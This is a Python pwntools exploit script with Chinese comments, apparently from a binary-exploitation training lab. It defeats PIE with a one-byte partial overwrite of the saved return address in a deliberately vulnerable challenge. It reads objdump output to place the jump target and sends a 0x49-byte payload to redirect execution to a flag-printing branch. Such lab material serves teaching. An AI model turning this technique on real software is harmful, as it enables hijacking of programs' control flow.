#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""lab_pie_partial_overwrite —— PIE + 1 字节溢出 → 局部覆盖 saved RIP LSB

漏洞：vuln() 里 read(0, buf, 0x40 + 8 + 1)，多读 9 字节，最后 1 字节落在
      saved rip 的最低字节上。

利用（无需任何泄漏）：
  PIE 只随机化**基址**，页内偏移固定 → 只要跳转目标与返回地址在同一个
  256 字节块内（高位 7 字节相同），1 字节覆盖就 100% 命中。
      返回地址 = main 里 `call vuln` 的下一条指令      (实测 0x143a)
      跳转目标 = main 里 `call win_path`（不可达分支）  (实测 0x1453)
  → payload = b"A"*0x48 + p8(0x53)

偏移不写死：exp 每次用 objdump 解析当前 chal，并断言两者同块，
所以改 chal.c 之后（只要 main < 0x100 字节、且带 aligned(256)）不会静默失效。

用法：
    cd labs/lab_pie_partial_overwrite
    make
    printf '__PWNED__{pie_partial_ok}\\n' > flag.txt
    python exp.py
    HOST=127.0.0.1 PORT=9999 python exp.py      # 远程（socat 起服务）
"""
import os
import re
import subprocess
import sys

from pwn import *

context.arch = "amd64"
context.log_level = "info"

BIN = "./chal"
HOST = os.getenv("HOST", "")
PORT = int(os.getenv("PORT", "9999"))

BUF = 0x40          # vuln() 的栈缓冲区大小
PAD = BUF + 8       # + saved rbp：再往后 1 字节就是 saved rip 的 LSB

RE_FUNC = re.compile(r"^([0-9a-f]+) <([^>]+)>:$")
RE_INSN = re.compile(r"^\s+([0-9a-f]+):\s+(\S+)\s*(.*)$")


def find_layout():
    """从 objdump 里取出 (返回地址, win 分支入口)，两者必须同 256 字节块。"""
    dis = subprocess.check_output(
        ["objdump", "-d", "-M", "intel", "--no-show-raw-insn", BIN], text=True
    )
    cur = None
    ret_addr = None
    win_addr = None
    armed = False          # 刚看到 main 里的 `call vuln`，下一行就是返回地址
    for line in dis.splitlines():
        m = RE_FUNC.match(line)
        if m:
            cur, armed = m.group(2), False
            continue
        m = RE_INSN.match(line)
        if not m or cur != "main":
            continue
        addr, mnem, args = int(m.group(1), 16), m.group(2), m.group(3)
        if armed:
            ret_addr, armed = addr, False
        if mnem == "call" and "<vuln>" in args:
            armed = True
        elif mnem == "call" and "<win_path>" in args:
            win_addr = addr
    if ret_addr is None or win_addr is None:
        raise SystemExit("[-] objdump 解析失败：没找到 call vuln / call win_path")
    if (ret_addr >> 8) != (win_addr >> 8):
        raise SystemExit(
            "[-] 布局不满足：ret=%#x win=%#x 不在同一 256 字节块（检查 main 是否 < 0x100 且 aligned(256)）"
            % (ret_addr, win_addr)
        )
    return ret_addr, win_addr


def start():
    if HOST:
        return remote(HOST, PORT)
    err = os.getenv("ERRLOG")
    return process(BIN, stderr=open(err, "wb") if err else None)


def exploit():
    ret_addr, win_addr = find_layout()
    log.info("ret_addr = %#x, win 分支 = %#x（同块 %#x）", ret_addr, win_addr, ret_addr >> 8 << 8)

    p = start()
    p.recvuntil(b"one byte, please:")
    payload = b"A" * PAD + p8(win_addr & 0xFF)      # 只覆盖 saved rip 的最低字节
    assert len(payload) == 0x40 + 8 + 1, "vuln() 的 read 长度是 0x49，必须正好发 0x49 字节"
    p.send(payload)
    return p.recvall(timeout=5)


if __name__ == "__main__":
    out = exploit()
    sys.stdout.buffer.write(out)
    sys.stdout.write("\n" if not out.endswith(b"\n") else "")
    if b"__PWNED__" not in out:
        raise SystemExit("[-] 没拿到 flag，检查 labs/lab_pie_partial_overwrite/flag.txt")
    log.success("PIE 局部覆盖（1 字节）OK")
